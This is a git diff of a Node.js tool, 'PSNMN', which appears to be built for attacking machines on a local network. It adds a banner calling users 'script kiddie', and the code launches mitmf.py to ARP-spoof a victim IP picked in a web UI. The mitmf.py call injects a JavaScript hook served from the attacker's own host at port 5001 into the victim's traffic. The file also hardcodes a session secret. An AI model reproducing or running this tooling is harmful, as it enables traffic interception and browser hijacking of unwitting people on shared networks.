@@ -15,6 +15,22 @@ var sys   = require('sys'),
     spawn = require('child_process').spawn;
 
 
+function displayWatermark(){
+	console.log("  _______   __    __   ______   __       __  __    __ \n"+
+" /       \\ /  \\  /  | /      \\ /  \\     /  |/  \\  /  |\n"+
+" $$$$$$$  |$$  \\ $$ |/$$$$$$  |$$  \\   /$$ |$$  \\ $$ |\n"+
+" $$ |__$$ |$$$  \\$$ |$$ \\__$$/ $$$  \\ /$$$ |$$$  \\$$ |\n"+
+" $$    $$/ $$$$  $$ |$$      \\ $$$$  /$$$$ |$$$$  $$ |\n"+
+" $$$$$$$/  $$ $$ $$ | $$$$$$  |$$ $$ $$/$$ |$$ $$ $$ |\n"+
+" $$ |      $$ |$$$$ |/  \\__$$ |$$ |$$$/ $$ |$$ |$$$$ |\n"+
+" $$ |      $$ | $$$ |$$    $$/ $$ | $/  $$ |$$ | $$$ |\n"+
+" $$/       $$/   $$/  $$$$$$/  $$/      $$/ $$/   $$/ \n");
+	console.log("\n | UI available at localhost:5001 	|\n | Hook available in public/hook folder |");
+	console.log("\n ~ Service PSNMN up and running ~\n ~  Be safe lil' script kiddie  ~ ")
+}
+
+displayWatermark();
+
 /*
 Virtual terminal Configuration:
 ->Spawns a terminal and listens for
@@ -50,7 +66,11 @@ Web server configuration:
 ->server is accessible from port 5001
 */
 app.use(express.static(__dirname + '/public'));
-app.use(session({secret: 'dIcKbuTT'}));
+app.use(session({
+	secret: 'dIcKbuTT',
+	resave: true,
+    saveUninitialized: true
+}));
 app.use(bodyParser.urlencoded({ extended: false }))
 
 app.get('/', function(req, res){
@@ -120,7 +140,7 @@ var scannedClients = function(baseName, queryName) {
 
 
 var ip = require("ip");
-console.log(ip.mask(ip.address(), ip.fromPrefixLen(24)));
+//console.log(ip.mask(ip.address(), ip.fromPrefixLen(24)));
 
 /*
 Listening to sockets and emitting data
@@ -161,7 +181,7 @@ listener.sockets.on('connection', function(socket){
         var gateway = ip.mask(ip.address(), ip.fromPrefixLen(24)).slice(0, -1)+"1";
         console.log(gateway)
         var scriptPath = 'http://'+ip.address()+':5001/hook/pnsmn.js';
-        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway','172.21.0.50','--inject','--js-url',scriptPath];
+        var options = ['mitmf.py','-i','wlan0','--spoof','--arp','--target',data.ip,'--gateway','192.168.0.1','--inject','--js-url',scriptPath];
         openTerminal("python",options);
     });
 
